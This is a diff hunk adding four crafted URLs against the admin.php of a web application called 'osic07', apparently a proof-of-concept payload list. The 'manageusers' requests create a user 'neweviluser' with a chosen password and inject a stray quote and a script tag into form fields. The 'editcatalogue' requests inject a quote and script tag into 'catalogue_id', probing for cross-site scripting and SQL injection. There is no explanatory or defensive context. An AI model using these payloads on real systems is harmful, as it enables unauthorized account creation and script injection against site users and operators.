@@ -1,0 +1,4 @@
+http://localhost/osic07/admin.php?action=manageusers&amp;username=neweviluser&amp;password=xyz&amp;confpass=xyz&amp;realname=&#039;&amp;type=&lt;script&gt;alert(&#039;hi&#039;)&lt;/script&gt;
+http://localhost/osic07/admin.php?action=manageusers&amp;id=777&amp;username=neweviluser&amp;password=xyz&amp;confpass=xyz&amp;realname=&#039;&amp;type=&lt;script&gt;alert(&#039;hi&#039;)&lt;/script&gt;
+http://localhost/osic07/admin.php?action=editcatalogue&amp;op=additems&amp;catalogue_id=&#039;&lt;script&gt;alert(&#039;hi&#039;)&lt;/script&gt;&amp;uploaded=true&amp;submit=true&amp;AddRemaining=true
+http://localhost/osic07/admin.php?action=editcatalogue&amp;op=additems&amp;catalogue_id=777&amp;uploaded=true&amp;submit=true&amp;catalogue_id=&#039;&lt;script&gt;alert(&#039;hi&#039;)&lt;/script&gt;
